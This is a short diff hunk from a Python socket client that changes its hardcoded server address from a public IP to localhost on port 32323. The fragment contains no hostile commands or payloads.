@@ -6,7 +6,7 @@ import threading
 import signal
 import ctypes
 
-ServerIP = "84.247.191.151"
+ServerIP = "127.0.0.1"
 ServerPort = 32323
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
